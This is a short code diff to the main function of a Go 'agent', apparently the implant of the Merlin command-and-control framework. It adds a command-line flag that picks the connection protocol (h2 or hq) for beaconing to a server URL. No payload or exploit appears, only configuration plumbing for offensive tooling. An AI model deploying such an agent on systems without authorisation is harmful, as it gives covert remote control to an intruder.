@@ -39,6 +39,7 @@ var url = "https://127.0.0.1:443/"
 var waitTime = 30000 * time.Millisecond
 var build = "nonRelease"
 var version = false
+var protocol = "h2"
 
 
 func main() {
@@ -47,6 +48,7 @@ func main() {
 	flag.BoolVar(&version, "version", false, "Print the agent version and exit")
 	flag.BoolVar(&debug, "debug", false, "Enable debug output")
 	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
+	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [h2, hq]")
 	flag.DurationVar(&waitTime, "sleep", 30000*time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
@@ -57,9 +59,9 @@ func main() {
 		os.Exit(0)
 	}
 
-	a := agent.New(verbose, debug)
+	a := agent.New(protocol, verbose, debug)
 	a.WaitTime = waitTime
-	a.Run(url, "h2")
+	a.Run(url)
 }
 
 
@@ -70,3 +72,4 @@ func usage() {
 	os.Exit(0)
 }
 
+// TODO make flag variables like Merlin Server so they don't need global variables
